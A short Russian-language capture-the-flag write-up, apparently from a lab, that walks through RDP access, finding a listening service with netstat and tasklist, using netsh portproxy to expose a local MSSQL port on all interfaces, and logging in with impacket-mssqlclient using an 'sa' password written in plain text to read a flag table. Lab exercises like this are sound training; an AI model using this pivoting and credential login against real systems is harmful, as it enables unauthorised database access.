Подключаемся по rdp и проверяем какие порты прослушаваются
```
netstat -ano
```
Отфильтруем процессы по интересующему индификатору
```
tasklist | findstr 960
```

Пробросим трафик и проверим
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=127.0.0.1 connectport=1433


netsh interface portproxy show all

```

Теперь с помощью impacket подключимся к mssql и прочитаем флаг

```
impacket-mssqlclient sa:'euteiGhaetah2ohy'@10.10.0.55 -p 8080

enum_db
use Flag
SELECT * FROM flag
```

